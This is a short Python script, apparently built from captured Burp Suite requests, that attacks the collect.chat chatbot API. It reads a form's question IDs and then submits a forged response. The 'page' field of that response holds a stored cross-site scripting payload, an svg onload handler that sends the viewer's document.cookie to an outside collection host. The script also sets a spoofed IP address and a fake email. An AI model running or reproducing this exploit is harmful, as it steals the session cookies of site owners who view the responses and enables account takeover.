
import requests
import json
import random

def collect_q(form):
 burp0_url = "https://load.collect.chat:443/bots/"+form
 burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Origin": "https://example.com/s", "DNT": "1", "Connection": "close", "Cache-Control": "max-age=0"}
 rr=requests.get(burp0_url, headers=burp0_headers)
 ids=[]
 r2=json.loads(rr.text)
 for i in r2['questions']:
  #print i
  ids.append(i['id'])
 user_id=r2["userId"]
 return ids[1],user_id

def send_data(q_id,form_id,user_id):
 burp0_url = "https://api.collect.chat:443/responses"
 burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-type": "application/json", "Origin": "null", "DNT": "1", "Connection": "close"}
 burp0_json={"_id": "F49CAC6B-26CA-4E5A-916F-2508582AE"+str(random.randint(300, 999)), "completed": True, "data": [{"answer": "hyuuuddd@si.com", "question": q_id}], "dropOffQuestion": q_id, "formId": form_id, "ipAddress": "123.12.123.4", "isMobile": False, "noSave": False, "page": "http://example.com/\"><svg/onload='new Image().src=\"https://jackluru02.000webhostapp.com/collect_cookie.php?cookie=\"+document.cookie'>", "sendIncomplete": False, "userId": user_id}
 requests.post(burp0_url, headers=burp0_headers, json=burp0_json)

form=raw_input("Enter Form Id=> ").strip()
idd,user=collect_q(form)
send_data(idd,form,user)

